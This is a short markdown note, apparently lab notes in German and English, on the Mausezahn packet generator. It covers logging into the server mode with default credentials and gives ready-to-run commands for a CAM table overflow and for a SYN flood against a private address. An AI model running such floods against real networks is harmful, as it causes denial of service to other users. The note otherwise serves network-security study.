---
title: Mausezahn
description: The Mausezahn software of the netsniff-ng toolkit
tags: software
---

# Config Mausezahn servermode
``` python
sudo mausezahn -x 99 #mausezahn server mode
#weiteres terminal �ffnen und dann �ber telnet NAME 99 auf Mausezahn server zugreifen
telnet 127.0.0.1 99
user: mz
pw: mz
enable pw: mops
run id 3 
```

Perform a CAM table overflow attack. //mit ping testen auf default gateway
``` python
mausezahn eth0 -c 128000 -a rand -p 64
```


SYN flood attack mit ping testen auf default gateway 
``` python
mausezahn eth0 -A rand -B 192.168.0.4 -c 0 -t tcp "dp=1-1023, flags=syn"
```